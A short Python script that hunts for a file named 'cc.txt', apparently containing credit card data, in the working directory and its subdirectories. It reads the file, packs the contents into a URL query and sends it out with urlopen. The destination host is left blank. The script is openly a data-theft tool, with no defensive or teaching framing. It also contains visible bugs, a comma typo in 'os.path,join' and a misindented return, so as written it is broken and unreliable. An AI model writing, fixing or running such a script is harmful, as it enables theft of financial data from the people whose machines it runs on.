from glob import glob
import os
from urllib.request import urlopen
def find_file():
    key_word = 'cc.txt'
    file_content = ''
    files = glob('*')
    print(files)
    if key_word in files:
        with open(key_word,'r') as f:
            file_content = f.read()
    else:
        for pathname in files:
            if os.path.isdir(pathname):
                files = glob(os.path,join(pathname,'*'))
                print(files)
                if os.path.join(pathname,key_word) in files:
                     with open(os.path.join(pathname,key_word),'r') as f:
                          file_content = f.read()
     return file_content
def push_file():
    content = find_file()
    content2 = content.replace('\n',';').replace(' ',',')
    url = ''+content2
    urlopen(url)
push_file()
